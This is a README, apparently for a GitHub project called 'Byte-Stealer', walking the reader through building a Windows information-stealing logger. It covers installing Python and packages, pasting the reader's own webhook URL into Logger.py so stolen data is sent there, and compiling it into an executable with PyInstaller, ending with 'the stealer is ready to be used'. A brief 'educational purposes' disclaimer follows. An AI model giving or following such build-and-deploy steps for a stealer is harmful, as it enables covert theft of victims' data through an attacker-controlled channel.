# How to use:

Requirements:\
• A windows machine
• VScode(Not required now but is helpful)

## Steps:
Current release isn't working btw!\
Download the .zip file from [main.zip](https://github.com/TurtlesXD/Byte-Stealer/archive/refs/heads/main.zip) and extract the data.Extract the data into a proper directory(like c://users//Yourusername//)and not Downloads or any other prebuilt windows directory or else the script wont work!\
Now if you dont have python run **Download-Python3.9.12.bat**. This will install python 3.9.12.\
If you already have python (3.9 or above) or have finished running **Download-Python3.9.12.bat**,\
Run **Install-Packages.bat**. This will download all the 3rd party packages used as well as pyinstaller for exe creation.\
Once you've finished running **Install-Packages.bat**,\
Now right click on Logger.py and open it with Idle 3.9\
Now go to line 58 and input your url into the webhook variable\
Now save the file\
Now you can run **buildExe.bat**, The file path should be ParentDirectory//Logger.py(Example: C:\Users\Admin\Logger.py)
```
 Note: Provide The actual paths(including the file name) to logger.py and an .ico file(optional) or else your exe will not be created!
```
Now open up the newly created *dist* folder and ***Boom***, your exe file has been created and the stealer is ready to be used!


> Note: This is for educational purposes, i do not condone the use of this script on people without their consent!

